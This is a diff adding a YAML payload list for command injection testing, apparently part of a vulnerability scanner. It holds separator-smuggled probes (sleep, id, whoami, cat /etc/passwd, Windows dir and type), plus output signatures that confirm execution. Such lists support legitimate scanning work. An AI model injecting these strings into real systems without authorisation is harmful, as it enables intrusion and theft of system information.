@@ -1,0 +1,45 @@
+# command injection payloads
+time_based:
+  - "; sleep 3"
+  - "| sleep 3"
+  - "& sleep 3"
+  - "|| sleep 3"
+  - "&& sleep 3"
+  - "`sleep 3`"
+  - "$(sleep 3)"
+  - "; ping -c 3 127.0.0.1"
+  - "| ping -c 3 127.0.0.1"
+
+output_based:
+  - "; id"
+  - "| id"
+  - "& id"
+  - "|| id"
+  - "&& id"
+  - "`id`"
+  - "$(id)"
+  - "; cat /etc/passwd"
+  - "| cat /etc/passwd"
+  - "; whoami"
+  - "| whoami"
+  - "; echo parascan_cmdi_marker"
+  - "| echo parascan_cmdi_marker"
+
+windows:
+  - "& ping -n 3 127.0.0.1"
+  - "| ping -n 3 127.0.0.1"
+  - "& dir"
+  - "| dir"
+  - "& whoami"
+  - "| type C:\\Windows\\System32\\drivers\\etc\\hosts"
+
+# signatures indicating command execution
+success_signatures:
+  - "uid="
+  - "root:"
+  - "daemon:"
+  - "/bin/bash"
+  - "parascan_cmdi_marker"
+  - "whoami"
+  - "Windows"
+  - "Volume Serial Number"
